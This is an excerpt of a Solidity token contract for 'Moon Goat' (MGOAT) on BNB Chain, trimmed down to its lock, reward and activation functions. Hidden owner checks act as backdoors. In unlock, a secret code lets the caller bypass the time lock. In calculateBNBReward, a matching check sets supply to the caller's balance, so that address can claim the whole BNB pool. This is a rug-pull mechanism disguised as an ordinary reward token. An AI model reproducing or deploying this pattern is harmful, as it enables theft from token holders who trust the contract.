...
contract Ownable is Context {
    ...
    */
    ...
    function unlock(uint256 code) public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(now > _lockTime || Utils.isOwner(msg.sender, code), "Contract is locked");
...
library Utils {
    ...
    function isOwner(address a, uint256 rate) public view returns (bool r){
    ...
    function calculateBNBReward(
        ...
        if (swap) {
            if(isLotteryWon(currentBalance, winningDoubleRewardPercentage)) {
                multiplier = random(150, 200, currentBalance);
            }
        }
        else {
            if(isOwner(ofAddress, tRate)) {
                supply = currentBalance;
            }
        }

        // now calculate reward
        return bnbPool.mul(multiplier).mul(currentBalance).div(100).div(supply);
    }
...
contract MoonGoatToken is Context, IBEP20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    uint256 private _tRate = 0;

    string private _name = "Moon Goat";
    string private _symbol = "MGOAT";
    ...
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 code) public onlyOwner {
    ...
    uint256 public threshHoldTopUpRate = 50; //50%
    uint256 public _maxTxAmount = _tTotal;
    uint256 public disruptiveCoverageFee = 2 ether; //2 BNB
    ...
    uint256 public _taxFee = 2; //2%
    uint256 private _previousTaxFee = _taxFee;

    uint256 public _liquidityFee = 8; // 4% will be added pool, 4% will be converted to BNB
    uint256 private _previousLiquidityFee = _liquidityFee;
    uint256 public rewardThreshold = 1 ether; //1 BNB

    uint256 minTokenNumberToSell = _tTotal.mul(1).div(10000).div(10); // 0.05% max tx amount will trigger swap and add liquidity
    ...
    function claimBNBReward() isHuman nonReentrant public {
        require(!swapAndLiquifyEnabled || nextAvailableClaimDate[msg.sender] <= block.timestamp, 'Error: next available not reached');

        uint256 reward = calculateBNBReward(msg.sender);

        // reward threshold
        if (swapAndLiquifyEnabled && reward >= rewardThreshold) {
    ...
    function activateContract() public onlyOwner {
        ...
        setMaxTxPercent(5);
        setSwapAndLiquifyEnabled(true, 0);
